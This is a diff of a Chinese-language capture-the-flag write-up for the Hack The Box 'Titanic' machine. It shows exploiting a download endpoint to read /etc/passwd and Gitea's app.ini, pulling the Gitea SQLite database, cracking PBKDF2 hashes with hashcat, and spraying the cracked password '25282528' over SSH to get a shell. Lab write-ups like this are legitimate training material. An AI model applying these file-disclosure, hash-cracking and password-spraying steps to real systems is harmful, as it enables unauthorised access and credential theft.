@@ -1,5 +1,10 @@
 # Titanic
 
+Gitea —— 一个用 Go语言（Golang） 编写的轻量级 Git 服务器
+```
+$ echo -e '10.129.231.221 titanic.htb\n10.129.231.221 dev.titanic.htb' | sudo tee -a /etc/hosts
+```
+
 ## 1.BurpSuite__http://titanic.htb
 拦截下载页面，下载内容是提交信息，生成.json文件
 
@@ -13,7 +18,7 @@ Seclists 是一个非常流行的安全测试和渗透工具列表，里面包�
 `git clone https://github.com/danielmiessler/SecLists.git`
 ![beautiful day](images/080303.png)
 
-## 3.在http://dev.titanic.htb的Explore里面，总体主要内容，非操作
+## 3.在dev.titanic.htb的Explore里面，总体主要内容，非操作
 ```
 Repositories
 ├── developer/docker-config      # Docker 配置集合
@@ -71,7 +76,7 @@ volumes:
 =
 宿主机的 /home/developer/gitea/data/gitea/conf/app.ini
 ```
-## 5.使用1.BurpSuite__http://titanic.htb把/etc/passwd换成得到的路径
+## 5.在第一个burpsuite拦截的页面把/etc/passwd换成得到的路径
 ![beautiful day](images/080304.png)
 #### 目的：BurpSuite（或者说攻击者）能通过 app.ini 中这段配置发现 SQLite 数据库的路径：
 ```
@@ -79,6 +84,55 @@ volumes:
 DB_TYPE = sqlite3
 PATH = /data/gitea/gitea.db //Gitea 使用 SQLite 数据库，并且数据库文件就存放在这
 ```
-## 6.
+## 6.信息泄露利用操作
+通过目标服务器上暴露的 HTTP 接口，下载 Gitea 服务的 SQLite 数据库文件
+![beautiful day](images/080305.png)
+![beautiful day](images/080306.png)
+[1]两个用户
+```
+$ echo -e 'administrator\ndevelop' > user  //把两个用户名写进users，-e启用\n作为换行符
+```
+[2]发现了 密码哈希 和 加密方式：pbkdf2$50000$50：使用 PBKDF2，迭代 50000 次，salt 长度 50
+发现pbkdf2$50000$50时，在Google搜索的关键词是：'gitea to hachcat'
+
+“gitea to hashcat” 意思是：
+
+ “如何将 Gitea 中提取的 pbkdf2 哈希导入 Hashcat 进行破解”
+ 
+「如何从 Gitea 导出密码哈希，然后用于 Hashcat 破解」
+
+```
+$ wget https://raw.githubusercontent.com/unix-ninja/hashcat/faa680fbab803723d77449b7107c1c985a6b7981/tools/gitea2hashcat.py
+
+$ sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
+```
+![beautiful day](images/080307.png)
+```
+$ vi titanic.gitea
+
+$ cp /usr/share/wordlists/rockyou.txt.gz ~/
+$ gzip -d ~/rockyou.txt.gz
+
+$ hashcat titanic.gitea rockyou.txt
+```
+![beautiful day](images/080308.png)
+密码为25282528
+
+用户名        	  来源	              密码哈希用途
+
+administrator  	Gitea admin 用户  	破解后可用于控制整个平台
+
+developer	      开发者账户	        破解后可能用于实际系统访问权限
+#### 使用 nxc 来 对多个用户名尝试同一个密码
+```
+$ nxc ssh 10.129.231.221 -u user -p '25282528'
+SSH     10.129.231.221 22     10.129.231.221    [+] developer:25282528 Linux - Shell access!
+```
+就可以开始远程登陆了
+```
+$ ssh developer@10.129.231.221
+```
+## 7
+
 
 
